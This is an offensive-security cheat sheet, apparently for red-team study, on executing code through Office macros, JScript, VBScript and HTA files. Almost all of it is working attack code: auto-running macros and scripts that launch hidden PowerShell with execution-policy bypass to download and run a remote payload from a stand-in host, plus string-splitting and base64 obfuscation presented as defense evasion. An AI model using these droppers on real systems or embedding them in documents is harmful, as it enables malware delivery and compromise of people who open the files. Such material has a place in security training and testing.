
Here's a cheat sheet with code examples for the topics "Client-Side Code Execution with Office" and "Client-Side Code Execution with Windows Script Host (WSH)":

###**Client-Side Code Execution with Office**

#### **Macro Execution in Office**
- **Basic Macro**: Execute PowerShell command via macro.

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Run "powershell -exec bypass -NoProfile -WindowStyle Hidden -Command ""IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"""
End Sub
```
- **Obfuscated Macro**: Hide the intent with simple obfuscation.

```vba
Sub AutoOpen()
    Dim x As String
    x = "powershell -exec bypass -NoProfile -WindowStyle Hidden -Command ""IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"""
    CreateObject("WScript.Shell").Run x
End Sub
```

#### ** Embedded PowerShell in Office Documents**
- **Embedding Base64 PowerShell**: Encodes PowerShell commands in Base64.

```vba
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell.exe -encodedCommand " & "JABhAHMAcwA9ACcAaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBwAGEAdABoAC0AdABvAC0AcABvAHcAZQByAHMAaABlAGwAbAAnADsAJABpAG8APQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAcwA9ACgAJABpAG8ALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAApACkAOwAkAGUAbgA9ACgAJABzACkAOwAkAG4APQAiAG4AZQB3AC0AbwBiAGoAZQBjAHQAIgA7ACgAJABuAGUAcwB0ACkAIgB8ACAAWwBzAGUAbABlAGMAdABdAFsAewAkAGEAbgByAC0AZwBlAHQALQBmAGkAbABlACAtAG4AbwBoAG8AcwB0AC0AcABhAGMAdABpAGMAbwBuAC0AbgBvAHIAZwAAtAB2AG8AbAB0AHMAfQA=="
    CreateObject("WScript.Shell").Run cmd
End Sub
```

#### ** Defense Evasion**
- **String Concatenation**: Breaks up suspicious commands.

```vba
Sub AutoOpen()
    Dim p As String
    p = "pow" & "ers" & "hell"
    CreateObject("WScript.Shell").Run p & " -exec bypass -NoProfile -WindowStyle Hidden -Command ""IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"""
End Sub
```

### **Client-Side Code Execution with Windows Script Host (WSH)**

#### ** JScript Execution**
- **Basic JScript**: Execute PowerShell via WSH.

```js
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell -exec bypass -NoProfile -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')\"");
```

#### ** VBScript Execution**
- **Basic VBScript**: Execute PowerShell via WSH.

```vbscript
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -exec bypass -NoProfile -WindowStyle Hidden -Command ""IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"""
```

#### ** Embedding Scripts in HTML Applications (HTA)**
- **HTA Example**: Execute a command via embedded script.

```html
<html>
<head>
    <script language="VBScript">
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "powershell -exec bypass -NoProfile -WindowStyle Hidden -Command ""IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"""
    </script>
</head>
</html>
```

#### ** Obfuscation Techniques**
- **String Obfuscation in JScript**: Breaks up suspicious keywords.

```js
var shell = new ActiveXObject("WScript.Shell");
var command = "pow" + "ers" + "hell -exec bypass -NoProfile -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')\"";
shell.Run(command);
```

#### **Launching Scripts via `cscript.exe` or `wscript.exe`**
- **Running VBScript with `cscript`**:

```sh
cscript.exe script.vbs
```
- **Running JScript with `wscript`**:

```sh
wscript.exe script.js
```

